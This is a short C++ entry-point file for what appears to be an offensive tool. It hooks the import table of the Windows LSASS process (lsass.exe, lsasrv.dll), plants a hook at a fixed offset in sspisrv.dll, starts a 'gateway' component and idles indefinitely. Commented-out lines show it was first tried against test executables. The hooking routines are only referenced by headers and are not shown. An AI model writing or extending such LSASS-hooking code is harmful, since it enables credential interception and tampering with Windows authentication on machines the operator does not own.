#include <cassert>
#include <cstdlib>
#include <print>
#include <thread>

#include "driver.h"
#include "finder.h"
#include "hook.h"
#include "gateway.h"
#include "ipc.h"


int main( ) {

	Sleep( 1000 );

	ipc::init( );

	//hook::hook_iat( "lsa_test2.exe", "lsa_test2.exe" );
	//hook::hook_iat( "harness.exe", "harness.exe" );
	hook::hook_iat( "lsass.exe", "lsasrv.dll" );

	hook::hook_cid_gather( "sspisrv.dll", 0x16F0, 13 );

	gateway::init( );

	while ( true ) {
		Sleep( 10 * 60000 );
	}

	return EXIT_SUCCESS;
}